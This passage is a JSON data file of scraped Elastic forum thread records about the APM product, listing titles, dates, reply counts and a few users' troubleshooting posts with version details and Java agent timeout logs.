    "url": "https://discuss.elastic.co/t/default-apm-server-docker-did-not-create-apm-7-5-1-transaction-and-apm-7-5-1-span-with-suffix-number-behind/215815",
    "title": "Default APM Server docker did not create apm-7.5.1-transaction and apm-7.5.1-span with suffix number behind",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 21, 2020, 7:07am January 23, 2020, 8:29am February 13, 2020, 4:29am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "06318148-ba7b-46ea-be6a-92a2380fcf07",
    "url": "https://discuss.elastic.co/t/apm-server-using-docker/216134",
    "title": "APM server using Docker",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 22, 2020, 8:59pm January 22, 2020, 11:21pm February 12, 2020, 7:12pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "72b4cfd5-8a9e-4506-af6a-6fafb6e7e0a8",
    "url": "https://discuss.elastic.co/t/does-apm-support-microsoft-dynamics-ax/216038",
    "title": "Does APM support Microsoft Dynamics AX?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 22, 2020, 2:07pm January 22, 2020, 10:43am January 22, 2020, 10:56am January 22, 2020, 11:08am January 22, 2020, 11:10am January 22, 2020, 11:18am January 22, 2020, 11:26am January 22, 2020, 11:31am January 22, 2020, 11:48am January 22, 2020, 12:01pm January 22, 2020, 12:36pm February 12, 2020, 8:36am",
    "body": "",
    "website_area": "discuss",
    "replies": 12
  },
  {
    "id": "21c7d088-88ba-4d82-bc46-75ff61c7a6ec",
    "url": "https://discuss.elastic.co/t/added-label-to-apm-which-has-the-incorrect-index-type/215650",
    "title": "Added label to APM which has the incorrect index 'type'",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 20, 2020, 12:19pm January 21, 2020, 1:51pm January 21, 2020, 1:56pm January 22, 2020, 1:55am January 22, 2020, 9:15am February 12, 2020, 5:15am",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "780a2aef-4c88-4ae5-8afd-618445776a76",
    "url": "https://discuss.elastic.co/t/apm-rum-js-agent-service-worker/215862",
    "title": "APM RUM JS Agent + Service worker",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 21, 2020, 11:24am January 21, 2020, 1:57pm January 21, 2020, 3:04pm February 11, 2020, 11:04am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "53b80b66-931b-4db8-9178-6b80cec4362e",
    "url": "https://discuss.elastic.co/t/please-ask-when-apm-server-supports-php-agent/215674",
    "title": "Please ask when APM Server supports PHP agent?",
    "category": [
      "APM"
    ],
    "author": "mikecui",
    "date": "January 20, 2020, 6:57am January 20, 2020, 7:23am January 21, 2020, 3:22am January 21, 2020, 7:55am February 11, 2020, 3:55am",
    "body": "If you are asking about a problem you are experiencing, please use the following template, as it will help us help you. If you have a different problem, please delete all of this text Kibana version: 7.5.1 Elasticsearch version:7.5.1 APM Server version:7.5.1 APM Agent language and version: Browser version: Original install method (e.g. download page, yum, deb, from source, etc.) and version: Fresh install or upgraded from other version? Is there anything special in your setup? For example, are you using the Logstash or Kafka outputs? Are you using a load balancer in front of the APM Servers? Have you changed index pattern, generated custom templates, changed agent configuration etc. Description of the problem including expected versus actual behavior. Please include screenshots (if relevant): Steps to reproduce: 1. 2. 3. Errors in browser console (if relevant): Provide logs and/or server output (if relevant):",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "c311aa01-4950-4148-ab1a-ca7120c4053d",
    "url": "https://discuss.elastic.co/t/apm-grails/215346",
    "title": "APM + Grails",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 16, 2020, 4:05pm January 17, 2020, 12:56pm January 17, 2020, 1:30pm January 20, 2020, 5:04pm February 10, 2020, 1:04pm",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "6e33e046-f022-4053-8245-dc7853c6ee08",
    "url": "https://discuss.elastic.co/t/dotnet-apm-not-displaying-data-on-the-span-chart/215719",
    "title": "Dotnet APM not displaying data on the span chart",
    "category": [
      "APM"
    ],
    "author": "asmutti",
    "date": "January 20, 2020, 11:23am January 20, 2020, 11:49am January 20, 2020, 11:56am February 10, 2020, 7:56am",
    "body": "Kibana version: 7.5.1 Elasticsearch version: 7.5.1 APM Server version: 7.5.1 APM Agent language and version: dotnet 1.2.0 Browser version: Chrome Is there any extra config that I must set up to show the span data? I'm pretty sure the spans info are sent to the ES.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "b12ae47a-4448-41df-b00d-21d877ff2725",
    "url": "https://discuss.elastic.co/t/elastic-apm-rum-js-agent-grouping-http-request-transactions/215380",
    "title": "Elastic APM RUM JS Agent - Grouping http-request transactions",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 16, 2020, 7:32pm January 17, 2020, 6:58pm January 17, 2020, 8:05pm February 7, 2020, 4:05pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "46627767-d199-470a-8401-bacb73e9513c",
    "url": "https://discuss.elastic.co/t/elastic-apm-cant-find-service-name-mentioned-in-elastic-apm-agent-on-kibana-ui-or-in-elastic-index/215440",
    "title": "Elastic apm : can't find service name mentioned in elastic apm agent on kibana ui or in elastic index",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 17, 2020, 10:44am January 17, 2020, 12:20pm February 7, 2020, 8:20am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "2099a891-5494-40fe-be6c-fd9df987d022",
    "url": "https://discuss.elastic.co/t/hosts-value-i-comment-apm-server-do-not-start/214822",
    "title": "Hosts value I comment , apm-server do not start",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 13, 2020, 1:51pm January 14, 2020, 6:31am January 17, 2020, 6:44am February 7, 2020, 2:44am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "2711db15-7e04-4465-be9d-abfc5190d882",
    "url": "https://discuss.elastic.co/t/websphere-application-server-support/215048",
    "title": "Websphere Application Server support",
    "category": [
      "APM"
    ],
    "author": "ledgpat",
    "date": "January 14, 2020, 9:31pm January 15, 2020, 6:34am January 15, 2020, 7:18pm January 16, 2020, 3:50pm January 16, 2020, 3:50pm February 6, 2020, 11:55am",
    "body": "Hello, I know that the Supported technologies page only lists Websphere Liberty as being officially supported, but I have also seen references to future Websphere classic/full support being on the radar. It's been a while since I have seen any updates, is this still something that is expected to be added officially? We have had success for the most part so far using the java agent with Websphere (classic) 8.5.5 in our development environment but would feel more comfortable with official support for production! Thanks,",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "72c56b32-096f-4e4c-ad9c-90550372dfbd",
    "url": "https://discuss.elastic.co/t/elastic-apm-rum-not-working-with-angular-8/214274",
    "title": "Elastic APM RUM not working with Angular 8",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 8, 2020, 4:12pm January 8, 2020, 4:34pm January 9, 2020, 2:56pm January 10, 2020, 1:02pm January 10, 2020, 3:03pm January 14, 2020, 9:42am January 15, 2020, 8:24pm January 16, 2020, 10:36am January 16, 2020, 1:41pm February 6, 2020, 9:42am",
    "body": "",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "6f7a7d3c-3ee5-47e1-9a04-d3a1269cb65a",
    "url": "https://discuss.elastic.co/t/transactions-tab-empty-but-data-with-transaction-id-available-in-apm-indices/214057",
    "title": "Transactions tab empty but data with `transaction.id` available in `apm-*` indices",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 7, 2020, 5:09pm January 7, 2020, 5:59pm January 8, 2020, 3:10pm January 12, 2020, 7:54pm January 14, 2020, 1:41pm January 14, 2020, 1:54pm January 14, 2020, 3:23pm January 15, 2020, 8:32am February 5, 2020, 4:32am",
    "body": "",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "3ad39eab-1fd0-4dbe-9a32-5596b6dc1362",
    "url": "https://discuss.elastic.co/t/limit-data-retention-on-the-hosted-product/214606",
    "title": "Limit data retention on the hosted product?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 11, 2020, 10:03am January 10, 2020, 2:57pm January 10, 2020, 6:52pm January 13, 2020, 7:56pm January 14, 2020, 8:20am January 14, 2020, 8:33am February 4, 2020, 4:33am",
    "body": "",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "375c66e4-c028-4983-9c5c-b39500b1bcea",
    "url": "https://discuss.elastic.co/t/capturing-stack-traces-from-graphqlerrors-in-apollo-server/212563",
    "title": "Capturing stack traces from GraphQLErrors in Apollo Server",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 20, 2019, 2:28pm January 9, 2020, 5:12pm January 14, 2020, 7:06am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "caf27ee5-02e8-4c72-821b-c3347a660fea",
    "url": "https://discuss.elastic.co/t/apm-agent-not-able-to-connect-apm-server/214874",
    "title": "APM agent not able to connect apm server",
    "category": [
      "APM"
    ],
    "author": "sattishv",
    "date": "January 13, 2020, 4:36pm January 13, 2020, 5:05pm February 3, 2020, 1:05pm",
    "body": "Hi Team, We were able to install elastic search, kibana and apm server successfully on MacOS and apm agent was hooked with the application deployed in ubuntu but not able to connect to apm server. Kibana version: 7.5.1 Elasticsearch version: 7.5.1 APM Server version: 7.5.1 APM Agent language and version: Java 7.5.1 Fresh install or upgraded from other version? Fresh install **Description of the problem including expected versus actual behavior. Please include screenshots config used: -javaagent:/elasticapmagent/elastic-apm-agent-1.12.0.jar -Delastic.apm.service_name=sampleserv -Delastic.apm.server_url=http://apm-serveripaddress:8200 -Delastic.apm.log_level=DEBUG Steps to reproduce: 1. 2. 3. Provide logs and/or server output (if relevant): INFO | jvm 1 | 2020/01/13 08:32:24 | java.net.SocketTimeoutException: connect timed out INFO | jvm 1 | 2020/01/13 08:32:24 | at java.net.PlainSocketImpl.socketConnect(Native Method) INFO | jvm 1 | 2020/01/13 08:32:24 | at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:350) INFO | jvm 1 | 2020/01/13 08:32:24 | at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206) INFO | jvm 1 | 2020/01/13 08:32:24 | at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188) INFO | jvm 1 | 2020/01/13 08:32:24 | at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392) INFO | jvm 1 | 2020/01/13 08:32:24 | at java.net.Socket.connect(Socket.java:589) INFO | jvm 1 | 2020/01/13 08:32:24 | at sun.net.NetworkClient.doConnect(NetworkClient.java:175) INFO | jvm 1 | 2020/01/13 08:32:24 | at sun.net.www.http.HttpClient.openServer(HttpClient.java:463) INFO | jvm 1 | 2020/01/13 08:32:24 | at sun.net.www.http.HttpClient.openServer(HttpClient.java:558) INFO | jvm 1 | 2020/01/13 08:32:24 | at sun.net.www.http.HttpClient.(HttpClient.java:242) INFO | jvm 1 | 2020/01/13 08:32:24 | at sun.net.www.http.HttpClient.New(HttpClient.java:339) INFO | jvm 1 | 2020/01/13 08:32:24 | at sun.net.www.http.HttpClient.New(HttpClient.java:357) INFO | jvm 1 | 2020/01/13 08:32:24 | at sun.net.www.protocol.http.HttpURLConnection.getNewHttpClient(HttpURLConnection.java:1220) INFO | jvm 1 | 2020/01/13 08:32:24 | at sun.net.www.protocol.http.HttpURLConnection.plainConnect0(HttpURLConnection.java:1156) INFO | jvm 1 | 2020/01/13 08:32:24 | at sun.net.www.protocol.http.HttpURLConnection.plainConnect(HttpURLConnection.java:1050) INFO | jvm 1 | 2020/01/13 08:32:24 | at sun.net.www.protocol.http.HttpURLConnection.connect(HttpURLConnection.java:984) INFO | jvm 1 | 2020/01/13 08:32:24 | at co.elastic.apm.agent.report.IntakeV2ReportingEventHandler.startRequest(IntakeV2ReportingEventHandler.java:200) INFO | jvm 1 | 2020/01/13 08:32:24 | at co.elastic.apm.agent.report.IntakeV2ReportingEventHandler.handleEvent(IntakeV2ReportingEventHandler.java:138) INFO | jvm 1 | 2020/01/13 08:32:24 | at co.elastic.apm.agent.report.IntakeV2ReportingEventHandler.onEvent(IntakeV2ReportingEventHandler.java:116) INFO | jvm 1 | 2020/01/13 08:32:24 | at co.elastic.apm.agent.report.IntakeV2ReportingEventHandler.onEvent(IntakeV2ReportingEventHandler.java:50) INFO | jvm 1 | 2020/01/13 08:32:24 | at co.elastic.apm.agent.shaded.lmax.disruptor.BatchEventProcessor.processEvents(BatchEventProcessor.java:168) INFO | jvm 1 | 2020/01/13 08:32:24 | at co.elastic.apm.agent.shaded.lmax.disruptor.BatchEventProcessor.run(BatchEventProcessor.java:125) INFO | jvm 1 | 2020/01/13 08:32:24 | at java.lang.Thread.run(Thread.java:748) INFO | jvm 1 | 2020/01/13 08:32:24 | 2020-01-13 08:32:24.872 [apm-reporter] INFO co.elastic.apm.agent.report.IntakeV2ReportingEventHandler - Backing off for 36 seconds (+/-10%) INFO | jvm 1 | 2020/01/13 08:31:21 | 2020-01-13 08:31:20.991 [apm-remote-config-poller] DEBUG co.elastic.apm.agent.configuration.ApmServerConfigurationSource - Reloading configuration from APM Server http://10.229.100.178:8200/config/v1/agents INFO | jvm 1 | 2020/01/13 08:31:26 | 2020-01-13 08:31:25.992 [apm-remote-config-poller] DEBUG co.elastic.apm.agent.report.ApmServerClient - Exception while interacting with APM Server, trying next one. INFO | jvm 1 | 2020/01/13 08:31:31 | 2020-01-13 08:31:30.997 [apm-remote-config-poller] ERROR co.elastic.apm.agent.report.HttpUtils - Exception when closing input stream of HttpURLConnection. INFO | jvm 1 | 2020/01/13 08:31:31 | 2020-01-13 08:31:30.997 [apm-remote-config-poller] ERROR co.elastic.apm.agent.configuration.ApmServerConfigurationSource - connect timed out INFO | jvm 1 | 2020/01/13 08:31:31 | 2020-01-13 08:31:30.997 [apm-remote-config-poller] DEBUG co.elastic.apm.agent.configuration.ApmServerConfigurationSource - Scheduling next remote configuration reload in 300s INFO | jvm 1 | 2020/01/13 08:31:40 | 2020-01-13 08:31:40.632 [apm-reporter] DEBUG co.elastic.apm.agent.report.IntakeV2ReportingEventHandler - Receiving METRICS event (sequence 25) INFO | jvm 1 | 2020/01/13 08:31:40 | 2020-01-13 08:31:40.633 [apm-reporter] DEBUG co.elastic.apm.agent.report.IntakeV2ReportingEventHandler - Starting new request to http://10.229.100.178:8200/intake/v2/events INFO | jvm 1 | 2020/01/13 08:31:45 | 2020-01-13 08:31:45.638 [apm-reporter] ERROR co.elastic.apm.agent.report.IntakeV2ReportingEventHandler - Failed to handle event of type METRICS with this error: connect timed out INFO | jvm 1 | 2020/01/13 08:31:45 | 2020-01-13 08:31:45.638 [apm-reporter] DEBUG co.elastic.apm.agent.report.IntakeV2ReportingEventHandler - Event handling failure INFO | jvm 1 | 2020/01/13 08:31:45 | java.net.SocketTimeoutException: connect timed out INFO | jvm 1 | 2020/01/13 08:31:45 | at java.net.PlainSocketImpl.socketConnect(Native Method) INFO | jvm 1 | 2020/01/13 08:31:45 | at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:350) INFO | jvm 1 | 2020/01/13 08:31:45 | at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206) INFO | jvm 1 | 2020/01/13 08:31:45 | at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188) INFO | jvm 1 | 2020/01/13 08:31:45 | at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392) INFO | jvm 1 | 2020/01/13 08:31:45 | at java.net.Socket.connect(Socket.java:589) INFO | jvm 1 | 2020/01/13 08:31:45 | at sun.net.NetworkClient.doConnect(NetworkClient.java:175) INFO | jvm 1 | 2020/01/13 08:31:45 | at sun.net.www.http.HttpClient.openServer(HttpClient.java:463) INFO | jvm 1 | 2020/01/13 08:31:45 | at sun.net.www.http.HttpClient.openServer(HttpClient.java:558) INFO | jvm 1 | 2020/01/13 08:31:45 | at sun.net.www.http.HttpClient.(HttpClient.java:242) INFO | jvm 1 | 2020/01/13 08:31:45 | at sun.net.www.http.HttpClient.New(HttpClient.java:339) INFO | jvm 1 | 2020/01/13 08:31:45 | at sun.net.www.http.HttpClient.New(HttpClient.java:357) INFO | jvm 1 | 2020/01/13 08:31:45 | at sun.net.www.protocol.http.HttpURLConnection.getNewHttpClient(HttpURLConnection.java:1220) INFO | jvm 1 | 2020/01/13 08:31:45 | at sun.net.www.protocol.http.HttpURLConnection.plainConnect0(HttpURLConnection.java:1156) INFO | jvm 1 | 2020/01/13 08:31:45 | at sun.net.www.protocol.http.HttpURLConnection.plainConnect(HttpURLConnection.java:1050) INFO | jvm 1 | 2020/01/13 08:31:45 | at sun.net.www.protocol.http.HttpURLConnection.connect(HttpURLConnection.java:984) INFO | jvm 1 | 2020/01/13 08:31:45 | at co.elastic.apm.agent.report.IntakeV2ReportingEventHandler.startRequest(IntakeV2ReportingEventHandler.java:200) INFO | jvm 1 | 2020/01/13 08:31:45 | at co.elastic.apm.agent.report.IntakeV2ReportingEventHandler.handleEvent(IntakeV2ReportingEventHandler.java:138) INFO | jvm 1 | 2020/01/13 08:31:45 | at co.elastic.apm.agent.report.IntakeV2ReportingEventHandler.onEvent(IntakeV2ReportingEventHandler.java:116) INFO | jvm 1 | 2020/01/13 08:31:45 | at co.elastic.apm.agent.report.IntakeV2ReportingEventHandler.onEvent(IntakeV2ReportingEventHandler.java:50) INFO | jvm 1 | 2020/01/13 08:31:45 | at co.elastic.apm.agent.shaded.lmax.disruptor.BatchEventProcessor.processEvents(BatchEventProcessor.java:168) INFO | jvm 1 | 2020/01/13 08:31:45 | at co.elastic.apm.agent.shaded.lmax.disruptor.BatchEventProcessor.run(BatchEventProcessor.java:125) INFO | jvm 1 | 2020/01/13 08:31:45 | at java.lang.Thread.run(Thread.java:748) INFO | jvm 1 | 2020/01/13 08:31:45 | 2020-01-13 08:31:45.639 [apm-reporter] INFO co.elastic.apm.agent.report.IntakeV2ReportingEventHandler - Backing off for 36 seconds (+/-10%) INFO | jvm 1 | 2020/01/13 08:32:19 | 2020-01-13 08:32:19.869 [apm-reporter] DEBUG co.elastic.apm.agent.report.IntakeV2ReportingEventHandler - Receiving METRICS event (sequence 26) INFO | jvm 1 | 2020/01/13 08:32:19 | 2020-01-13 08:32:19.869 [apm-reporter] DEBUG co.elastic.apm.agent.report.IntakeV2ReportingEventHandler - Starting new request to http://10.229.100.178:8200/intake/v2/events INFO | jvm 1 | 2020/01/13 08:32:24 | 2020-01-13 08:32:24.872 [apm-reporter] ERROR co.elastic.apm.agent.report.IntakeV2ReportingEventHandler - Failed to handle event of type METRICS with this error: connect timed out INFO | jvm 1 | 2020/01/13 08:32:24 | 2020-01-13 08:32:24.872 [apm-reporter] DEBUG co.elastic.apm.agent.report.IntakeV2ReportingEventHandler - Event handling failure",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "496fa0e1-7692-4c27-bda3-72624d4c3909",
    "url": "https://discuss.elastic.co/t/transaction-sample-rate-minimun-value-allowed/214870",
    "title": "Transaction_sample_rate minimun value allowed",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 13, 2020, 4:32pm January 13, 2020, 4:42pm February 3, 2020, 12:42pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "2fded50f-0fb0-45e1-ac18-1c4fc8597d8a",
    "url": "https://discuss.elastic.co/t/load-apm-data-into-kibana-dashboard/214790",
    "title": "Load APM data into Kibana Dashboard",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 13, 2020, 10:04am January 13, 2020, 10:17am January 13, 2020, 10:54am January 13, 2020, 3:45pm February 3, 2020, 11:45am",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "70afc5e5-53d7-4729-a8e1-c4c17fb6586d",
    "url": "https://discuss.elastic.co/t/access-metric-of-a-transaction/214815",
    "title": "Access metric of a transaction",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 13, 2020, 11:34am January 13, 2020, 2:52pm January 13, 2020, 2:54pm February 3, 2020, 10:54am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "6ec7e00b-cb12-4eb1-acc3-4a8ea85a6ce0",
    "url": "https://discuss.elastic.co/t/elastic-apm-agent-attached-to-java-application-running-on-jboss-7-2-2-eap/214588",
    "title": "Elastic apm agent attached to java application running on JBoss 7.2.2 EAP",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 10, 2020, 11:09am January 12, 2020, 4:46am January 12, 2020, 7:18pm January 13, 2020, 6:31am February 3, 2020, 2:31am",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "52381d2d-4a9b-479a-911c-a1fa70f29191",
    "url": "https://discuss.elastic.co/t/elastic-apm-dropping-spans-from-large-distributed-transactions/214241",
    "title": "Elastic APM dropping spans from large distributed transactions",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 11, 2020, 10:03am January 8, 2020, 3:35pm January 8, 2020, 3:44pm January 9, 2020, 9:19am January 10, 2020, 2:53pm January 31, 2020, 10:53am",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "214866fc-cc3d-4c57-912d-b3d628e97257",
    "url": "https://discuss.elastic.co/t/is-it-possible-advisable-to-use-apm-in-my-scenario/214392",
    "title": "Is it possible / advisable to use APM in my scenario?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 9, 2020, 9:36am January 9, 2020, 9:55am January 9, 2020, 10:05am January 9, 2020, 1:22pm January 30, 2020, 9:22am",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "c4df0347-7860-4557-a5a5-c2ba9097376b",
    "url": "https://discuss.elastic.co/t/apm-correlate-logs-jboss-6-0-1/214271",
    "title": "APM correlate logs jboss 6.0.1",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 9, 2020, 5:48am January 9, 2020, 5:58am January 9, 2020, 8:21am January 9, 2020, 9:20am January 9, 2020, 11:52am January 30, 2020, 7:48am",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "58baf023-ff21-441d-a663-9dce6f88cf28",
    "url": "https://discuss.elastic.co/t/is-apm-server-port-8200-secure-by-default-how-to-make-it-secure/213780",
    "title": "Is APM Server (port 8200) secure by default? How to make it secure?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 6, 2020, 7:30am January 8, 2020, 3:35am January 8, 2020, 3:35am January 28, 2020, 11:35pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "3e214d2c-34d1-4073-a03e-7ef9f6004205",
    "url": "https://discuss.elastic.co/t/apm-not-creating-aliases/212427",
    "title": "APM not creating aliases",
    "category": [
      "APM"
    ],
    "author": "jmcpherson",
    "date": "December 19, 2019, 2:58am December 19, 2019, 9:10am December 19, 2019, 1:10pm December 20, 2019, 1:54pm January 7, 2020, 3:47pm January 28, 2020, 11:47am",
    "body": "Kibana version: 7.5.0 Elasticsearch version: 7.5.0 APM Server version: 7.5.0 Original install method (e.g. download page, yum, deb, from source, etc.) and version: ECK Manifest Fresh install or upgraded from other version? Fresh Description of the problem including expected versus actual behavior. Please include screenshots (if relevant): I am running ECK eck/eck-operator:1.0.0-beta1 and have a elastic/apm/kibana stack setup across approximately 30 clusters. On some of these everything seems to be working fine: Kibana_12286×712 85.5 KB On others it looks like so: Kibana2288×612 76.4 KB and I start seeing illegal_argument_exception: index.lifecycle.rollover_alias [apm-7.5.0-error] does not point to index [apm-7.5.0-error] in kibana and the following in the apm server logs: 2019-12-19T02:49:56.716Z ERROR pipeline/output.go:100 Failed to connect to backoff(elasticsearch(https://monitoring-es-http.client-env-monitoring.svc:9200)): Connection marked as failed because the onConnect callback failed: resource 'apm-7.5.0-error' exists, but it is not an alias 2019-12-19T02:49:56.716Z INFO pipeline/output.go:93 Attempting to reconnect to backoff(elasticsearch(https://monitoring-es-http.client-env-monitoring.svc:9200)) with 3734 reconnect attempt(s) I'm assuming these aliases should be getting creating but I am not completely sure on that so I guess that's my first question, do I need to create these aliases manually? If not, I could use a bit of direction in figuring out what is going on. Steps to reproduce: Unsure",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "95880d68-b0d2-4e68-852f-019be9dd9160",
    "url": "https://discuss.elastic.co/t/activerecord-profiling-with-sinatra/214010",
    "title": "ActiveRecord profiling with Sinatra",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 7, 2020, 9:21am January 7, 2020, 9:36am January 7, 2020, 11:43am January 28, 2020, 7:43am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "c223489d-bb9a-400d-aeb4-84122eb26134",
    "url": "https://discuss.elastic.co/t/elastic-apm-not-displaying-scheduler-jobs/213956",
    "title": "Elastic APM Not Displaying Scheduler jobs",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 8, 2020, 3:35am January 7, 2020, 9:48am January 28, 2020, 5:48am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "c264170b-c595-4001-b03d-9e02d00cb179",
    "url": "https://discuss.elastic.co/t/apm-server-unable-to-get-data-from-my-servlet-based-application/213126",
    "title": "APM Server unable to get data from my servlet based application",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 27, 2019, 8:03am December 27, 2019, 6:06am December 27, 2019, 6:15am December 27, 2019, 6:20am December 27, 2019, 8:21am December 27, 2019, 8:29am December 30, 2019, 10:56am December 30, 2019, 10:59am December 30, 2019, 11:00am January 6, 2020, 7:44am January 7, 2020, 9:33am January 28, 2020, 5:33am",
    "body": "",
    "website_area": "discuss",
    "replies": 12
  },
  {
    "id": "47aa8fba-ea07-4a24-b075-4f9c9eb21f54",
    "url": "https://discuss.elastic.co/t/apm-nodejs-default-code-is-resulting-in-error/213886",
    "title": "APM NodeJS default code is resulting in error",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 7, 2020, 8:48am January 6, 2020, 12:33pm January 6, 2020, 12:33pm January 27, 2020, 8:33am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "b8a3c0d2-e15e-4137-89f6-cc498abe8a8e",
    "url": "https://discuss.elastic.co/t/how-to-add-and-process-private-custom-attributes-in-elastic-apm-traceparent/213033",
    "title": "How to add and process private custom attributes in elastic-apm-traceparent?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 26, 2019, 3:38am December 26, 2019, 3:39am January 6, 2020, 8:19am January 27, 2020, 4:19am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "42171800-99ab-41d3-a82e-797466c2ef51",
    "url": "https://discuss.elastic.co/t/apm-traces-tab-doesnt-split-out-different-services/213605",
    "title": "APM Traces Tab Doesn't Split out different services",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 2, 2020, 6:40pm January 2, 2020, 8:39pm January 2, 2020, 8:39pm January 23, 2020, 4:40pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "1ec10fbe-372f-4f0c-bc1c-b9fd5a9d9009",
    "url": "https://discuss.elastic.co/t/apm-net-agent-dont-capture-http-status-2xx/211339",
    "title": "APM .NET Agent don't Capture Http Status 2xx",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 11, 2019, 2:07am December 31, 2019, 1:02pm January 2, 2020, 8:17pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "ed451d82-af68-4ccc-aa2e-8a7699430534",
    "url": "https://discuss.elastic.co/t/is-it-possible-to-embed-user-id-for-apm-messages-in-django/212805",
    "title": "Is it possible to embed user-id for apm messages in Django?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 23, 2019, 6:12am January 2, 2020, 9:08am January 23, 2020, 5:08am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "3303883c-5252-4d44-a5ad-9d69907874f8",
    "url": "https://discuss.elastic.co/t/elastic-cloud-more-than-100-apm-indices-how-to-automate-the-deletion/213485",
    "title": "Elastic Cloud - More than 100 APM indices - How to automate the deletion?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 1, 2020, 10:56am January 1, 2020, 5:42pm January 22, 2020, 1:38pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "7f747e9f-72e8-47c3-986f-c78f47e269e0",
    "url": "https://discuss.elastic.co/t/questions-about-transaction/213069",
    "title": "Questions about transaction",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 26, 2019, 11:07am December 29, 2019, 7:25am December 29, 2019, 8:22am December 29, 2019, 8:45am December 31, 2019, 9:12pm January 1, 2020, 6:17am January 22, 2020, 2:17am",
    "body": "",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "09608787-e7df-4158-9a88-cd1e814efc4d",
    "url": "https://discuss.elastic.co/t/run-apm-server-with-docker-compose/213345",
    "title": "Run APM Server with Docker Compose",
    "category": [
      "APM"
    ],
    "author": "drnextgis",
    "date": "December 30, 2019, 12:07pm December 30, 2019, 4:09pm December 31, 2019, 5:26pm January 21, 2020, 1:26pm",
    "body": "Is there any docker-compose.yml file that can be used to run APM server without building it?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "b2c88f46-7166-4e22-852c-77d4e1956c20",
    "url": "https://discuss.elastic.co/t/cannot-create-apm-watcher-email-error-report/212537",
    "title": "Cannot create APM watcher email error report",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 23, 2019, 6:15am December 30, 2019, 1:11pm December 30, 2019, 1:11pm January 20, 2020, 9:19am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
